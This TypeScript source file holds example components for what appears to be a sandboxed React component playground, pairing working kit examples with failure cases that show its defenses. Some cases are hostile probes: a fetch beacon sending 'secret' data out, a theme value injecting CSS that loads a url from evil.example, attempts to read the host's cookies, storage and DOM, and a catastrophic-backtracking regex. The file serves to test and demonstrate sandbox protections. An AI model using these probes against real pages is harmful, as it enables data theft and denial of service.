export type Example = {
  id: string
  label: string
  group: 'works' | 'fails'
  /** One line on what this example demonstrates. */
  explains: string
  code: string
  /** Theme panel JSON to load with the example (empty = default theme). */
  theme?: string
}

export const EXAMPLES: Example[] = [
  {
    id: 'profile-card',
    group: 'works',
    explains: 'A component with a props contract, rendered in the sandbox.',
    label: 'Profile card',
    code: `import { useState } from 'react'
import { z } from 'zod'
import { Badge, Button, Card, Stack, Text } from '@kit/ui'

// The contract: validated before every render.
export const propsSchema = z.object({
  name: z.string().min(1),
  role: z.string(),
  skills: z.array(z.string()).max(5),
})

export const exampleProps = {
  name: 'Ada Lovelace',
  role: 'Engineer',
  skills: ['analysis', 'algorithms'],
}

type Props = z.infer<typeof propsSchema>

export default function ProfileCard({ name, role, skills }: Props) {
  const [following, setFollowing] = useState(false)

  return (
    <Card title={name}>
      <Stack gap={12}>
        <Text tone="muted">{role}</Text>
        <Stack direction="row" gap={6}>
          {skills.map((s) => <Badge key={s}>{s}</Badge>)}
        </Stack>
        <Stack direction="row" gap={8}>
          <Button variant={following ? 'ghost' : 'primary'} onClick={() => setFollowing(!following)}>
            {following ? 'Following' : 'Follow'}
          </Button>
          {following && <Badge tone="success">connected</Badge>}
        </Stack>
      </Stack>
    </Card>
  )
}
`,
  },
  {
    id: 'invalid-props',
    group: 'fails',
    explains: 'Props contract: invalid exampleProps are rejected before render. Edit them in the props panel.',
    label: 'Invalid props',
    code: `// exampleProps break the schema, so the component never renders
// with bad data. Edit them in the props panel to make it pass.
import { z } from 'zod'
import { Card, Text } from '@kit/ui'

export const propsSchema = z.object({
  title: z.string().min(1),
  rating: z.number().int().min(1).max(5),
  email: z.email(),
})

export const exampleProps = {
  title: '',
  rating: 7,
  email: 'not-an-email',
}

export default function Review({ title, rating, email }: z.infer<typeof propsSchema>) {
  return (
    <Card title={title}>
      <Text>{'★'.repeat(rating)}</Text>
      <Text tone="muted">{email}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'blocked-import',
    group: 'fails',
    explains: 'Import allowlist: the host rejects this before the code reaches the sandbox.',
    label: 'Disallowed import',
    code: `// Only react, zod and @kit/ui can be imported.
// This never reaches the sandbox: the host rejects it first.
import confetti from 'canvas-confetti'
import { Card, Text } from '@kit/ui'

export default function Party() {
  confetti()
  return (
    <Card title="Party">
      <Text>🎉</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'sneaky-require',
    group: 'fails',
    explains: "Import allowlist: a computed module name slips past the host scan, so the sandbox's require rejects it.",
    label: 'Dynamic require',
    code: `// Computing the module name hides it from the host's static check,
// so the sandbox's own require() rejects it at runtime.
import { Card, Text } from '@kit/ui'

const name = ['node', 'fs'].join(':')
const fs = require(name)

export default function Sneaky() {
  return (
    <Card title="Sneaky">
      <Text>{String(fs)}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'render-throw',
    label: 'Render error',
    group: 'fails',
    explains: 'Error boundary: a throw during render is caught inside the sandbox; the host keeps working.',
    code: `import { Card, Text } from '@kit/ui'

export const exampleProps = { user: null }

export default function Greeting({ user }: { user: { name: string } | null }) {
  // user is null, so this throws while rendering
  return (
    <Card title="Hello">
      <Text>{user!.name}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'handler-throw',
    label: 'Error in a click handler',
    group: 'fails',
    explains: 'Runtime errors: event handlers run outside render, so the sandbox reports them from window.onerror.',
    code: `import { Button, Card, Text } from '@kit/ui'

export default function Checkout() {
  return (
    <Card title="Checkout">
      <Text tone="muted">Renders fine. Click the button.</Text>
      <Button onClick={() => { throw new Error('Payment service is not configured') }}>
        Pay now
      </Button>
    </Card>
  )
}
`,
  },
  {
    id: 'infinite-loop',
    label: 'Infinite loop',
    group: 'fails',
    explains: 'Loop guard: every loop is instrumented and stops after 1s. The watchdog is the backstop for other hangs.',
    code: `import { Card, Text } from '@kit/ui'

export default function Spinner() {
  let ticks = 0
  while (true) {
    ticks++ // never ends
  }
  return (
    <Card title="Unreachable">
      <Text>{ticks}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'hang-without-loop',
    label: 'Hang without a loop',
    group: 'fails',
    explains: 'Watchdog: regex backtracking has no loop to guard, so the host restarts the frozen sandbox (Chromium isolates the frame; other browsers may freeze the tab for a few seconds).',
    code: `import { Card, Text } from '@kit/ui'

// Catastrophic backtracking: runs for minutes, with no loop in sight.
const evil = /^(a+)+$/
const input = 'a'.repeat(30) + '!'

export default function Validator() {
  const ok = evil.test(input)
  return (
    <Card title="Validator">
      <Text>{ok ? 'valid' : 'invalid'}</Text>
    </Card>
  )
}
`,
  },
  {
    id: 'network',
    label: 'Network request',
    group: 'fails',
    explains: 'CSP: connect-src \'none\' blocks fetch, XHR and WebSockets, so code can\'t send data anywhere.',
    code: `import { useEffect, useState } from 'react'
import { Badge, Card, Text } from '@kit/ui'

export default function Beacon() {
  const [result, setResult] = useState('sending…')

  useEffect(() => {
    fetch('https://example.com/collect?data=secret')
      .then(() => setResult('sent (this should never happen)'))
      .catch((err) => setResult('blocked: ' + err.message))
  }, [])

  return (
    <Card title="Beacon">
      <Text>{result}</Text>
      <Badge tone="warning">fetch</Badge>
    </Card>
  )
}
`,
  },
  {
    id: 'escape',
    label: 'Reach into the host page',
    group: 'fails',
    explains: "Opaque origin + sandbox flags: no access to the host's DOM, cookies or storage, and no navigating the top window.",
    code: `import { Card, Stack, Text } from '@kit/ui'

function attempt(label: string, fn: () => unknown) {
  try {
    return label + ': ' + String(fn())
  } catch (err) {
    return label + ': blocked (' + (err as Error).name + ')'
  }
}

export default function Escape() {
  const results = [
    attempt('parent DOM', () => window.parent.document.title),
    attempt('cookies', () => document.cookie),
    attempt('localStorage', () => localStorage.getItem('x')),
    attempt('top navigation', () => { window.top!.location.href = 'https://example.com'; return 'navigated?' }),
  ]
  return (
    <Card title="Escape attempts">
      <Stack gap={4}>{results.map((r) => <Text key={r}>{r}</Text>)}</Stack>
    </Card>
  )
}
`,
  },
  {
    id: 'pricing-card',
    label: 'Pricing card (slots)',
    group: 'works',
    explains: 'Composed from the kit: slots put a badge in the header and actions in the footer, with no changes to the kit.',
    code: `import { useState } from 'react'
import { z } from 'zod'
import { Badge, Button, Card, Stack, Text } from '@kit/ui'

// Built from the kit without changing it: slots place content
// in the card's aside and footer.
export const propsSchema = z.object({
  plan: z.string().min(1),
  price: z.number().nonnegative(),
  features: z.array(z.string()).max(6),
  popular: z.boolean(),
})

export const exampleProps = {
  plan: 'Team',
  price: 12,
  features: ['Unlimited projects', 'Shared themes', 'Priority support'],
  popular: true,
}

export default function PricingCard({ plan, price, features, popular }: z.infer<typeof propsSchema>) {
  const [seats, setSeats] = useState(3)

  return (
    <Card
      title={plan}
      slots={{
        aside: popular ? <Badge tone="success">popular</Badge> : undefined,
        footer: (
          <Stack direction="row" gap={8}>
            <Button slots={{ icon: <span>+</span>, end: <span>{seats}</span> }} onClick={() => setSeats(seats + 1)}>
              Add seat
            </Button>
            <Button variant="ghost" onClick={() => setSeats(1)}>Reset</Button>
          </Stack>
        ),
      }}
    >
      <Stack gap={10}>
        <Text>
          <strong>\${price * seats}</strong> / month for {seats} {seats === 1 ? 'seat' : 'seats'}
        </Text>
        <Stack gap={4}>
          {features.map((f) => <Text key={f} tone="muted">✓ {f}</Text>)}
        </Stack>
      </Stack>
    </Card>
  )
}
`,
  },
  {
    id: 'empty-state',
    label: 'Empty state (custom header)',
    group: 'works',
    explains: 'A slot can hold any component: here a custom header replaces the card title.',
    code: `import { Button, Card, Stack, Text } from '@kit/ui'

// A custom header in place of the title, plus a footer note.
function Header() {
  return (
    <Stack direction="row" gap={8}>
      <span aria-hidden>▢</span>
      <strong>No components yet</strong>
    </Stack>
  )
}

export default function EmptyState() {
  return (
    <Card slots={{ header: <Header />, footer: <Text tone="muted">Tip: start from an example.</Text> }}>
      <Stack gap={12}>
        <Text tone="muted">Components you build from the kit will show up here.</Text>
        <Button slots={{ icon: <span>+</span> }}>New component</Button>
      </Stack>
    </Card>
  )
}
`,
  },
  {
    id: 'themed-kit',
    label: 'Themed kit',
    group: 'works',
    explains: 'Theme tokens restyle every kit component. Try the presets in the theme panel.',
    theme: JSON.stringify({ accent: '#7aa2f7', surface: '#1f2230', text: '#e6e8f0', radius: 10 }, null, 2),
    code: `import { Badge, Button, Card, Stack, Text } from '@kit/ui'

export default function Themed() {
  return (
    <Card title="Theme check">
      <Stack gap={12}>
        <Text tone="muted">Every kit component reads its colors, radius and spacing from theme tokens.</Text>
        <Stack direction="row" gap={6}>
          <Badge>neutral</Badge>
          <Badge tone="success">success</Badge>
          <Badge tone="warning">warning</Badge>
        </Stack>
        <Stack direction="row" gap={8}>
          <Button>Primary</Button>
          <Button variant="ghost">Ghost</Button>
        </Stack>
      </Stack>
    </Card>
  )
}
`,
  },
  {
    id: 'theme-injection',
    label: 'CSS injection in a theme token',
    group: 'fails',
    explains: 'Theme schema: tokens only accept hex colors and bounded numbers, so a value can’t carry extra CSS. The last valid theme stays applied.',
    theme: JSON.stringify({ accent: 'red; background: url(https://evil.example/pixel.png)', radius: 999 }, null, 2),
    code: `import { Badge, Button, Card, Stack, Text } from '@kit/ui'

export default function Themed() {
  return (
    <Card title="Theme check">
      <Stack gap={12}>
        <Text tone="muted">Every kit component reads its colors, radius and spacing from theme tokens.</Text>
        <Stack direction="row" gap={6}>
          <Badge>neutral</Badge>
          <Badge tone="success">success</Badge>
          <Badge tone="warning">warning</Badge>
        </Stack>
        <Stack direction="row" gap={8}>
          <Button>Primary</Button>
          <Button variant="ghost">Ghost</Button>
        </Stack>
      </Stack>
    </Card>
  )
}
`,
  },
  {
    id: 'theme-contrast',
    label: 'Unreadable theme',
    group: 'fails',
    explains: 'Theme rules can check the whole theme, not just each value: text on surface must meet 4.5:1 contrast.',
    theme: JSON.stringify({ text: '#c8c8c8', surface: '#ffffff' }, null, 2),
    code: `import { Badge, Button, Card, Stack, Text } from '@kit/ui'

export default function Themed() {
  return (
    <Card title="Theme check">
      <Stack gap={12}>
        <Text tone="muted">Every kit component reads its colors, radius and spacing from theme tokens.</Text>
        <Stack direction="row" gap={6}>
          <Badge>neutral</Badge>
          <Badge tone="success">success</Badge>
          <Badge tone="warning">warning</Badge>
        </Stack>
        <Stack direction="row" gap={8}>
          <Button>Primary</Button>
          <Button variant="ghost">Ghost</Button>
        </Stack>
      </Stack>
    </Card>
  )
}
`,
  },
  {
    id: 'bad-slot',
    label: 'A slot that throws',
    group: 'fails',
    explains: 'Each slot has its own error boundary, so a failing slot is replaced by a placeholder and the rest of the component still renders.',
    code: `import { Badge, Button, Card, Stack, Text } from '@kit/ui'

type Stat = { label: string; value: number }

// Bug: \`stats\` is never passed, so this slot throws while rendering.
function Stats({ stats }: { stats?: Stat[] }) {
  return <Badge>{stats!.length} stats</Badge>
}

export default function Report() {
  return (
    <Card title="Weekly report" slots={{ aside: <Stats />, footer: <Button variant="ghost">Export</Button> }}>
      <Stack gap={6}>
        <Text>Only the aside slot fails. The title, body and footer still render.</Text>
      </Stack>
    </Card>
  )
}
`,
  },
  {
    id: 'patch-kit',
    label: 'Patch the kit',
    group: 'fails',
    explains: 'The kit is frozen: replacing or patching a component throws, so customizing has to go through tokens and slots.',
    code: `import * as ui from '@kit/ui'

// Customizing goes through theme tokens and slots. Replacing or
// patching kit components isn't possible: the kit is frozen.
function LoudButton() {
  return <button style={{ background: 'hotpink' }}>HACKED</button>
}

;(ui as any).Button = LoudButton

export default function Patched() {
  return <ui.Card title="Patched kit"><ui.Button>Save</ui.Button></ui.Card>
}
`,
  },
]
